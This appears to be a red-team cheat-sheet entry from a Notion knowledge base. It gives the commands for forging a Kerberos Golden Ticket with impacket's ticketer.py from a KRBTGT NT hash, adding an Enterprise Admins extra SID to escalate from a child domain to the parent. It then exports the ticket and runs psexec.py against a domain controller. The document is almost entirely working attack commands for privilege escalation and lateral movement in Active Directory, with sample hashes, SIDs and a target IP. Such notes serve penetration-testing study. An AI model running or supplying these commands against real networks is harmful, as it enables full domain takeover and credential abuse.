# Ticketer.py: Golden Ticket (Extra Sids)

OS: Active_Directory, Windows
Description: Forge a Golden Ticket Given the nthash of KRBTGT
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21), Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)

```jsx
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain child.TargetDomain.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

### Export it

```jsx
export KRB5CCNAME=hacker.ccache 
```

### PSExec using Kerberos

```jsx
psexec.py Child.Targetdomain.LOCAL/dc.ParentDomain.local -k -no-pass -target-ip 172.16.5.5
```